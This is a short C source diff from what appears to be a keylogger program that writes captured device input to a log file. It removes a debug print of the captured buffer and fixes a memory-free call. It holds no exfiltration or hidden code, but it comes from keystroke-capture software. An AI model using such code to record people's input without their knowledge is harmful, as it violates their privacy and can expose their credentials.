@@ -76,7 +76,6 @@ static int deinit_device(struct deviceInfo* device, struct configInfo* config, s
             if (m_append_array_char(&device->devlog, "\n\0", 2)) {
                 LOG(-1, "append_mbuffer_array_char failed!\n");
             }
-            LOG(1, "-> %s\n", device->devlog.b);
 
             // write keylog to the log file
             if (write(kbd->outfd, (char*)device->devlog.b, device->devlog.size) < 0) {
@@ -508,7 +507,7 @@ int main(int argc, char* argv[])
                 }
             }
         }
-        free(m_deviceInfo(&device));
+        m_free(&device);
     }
 
     if (close(config.configfd)) {
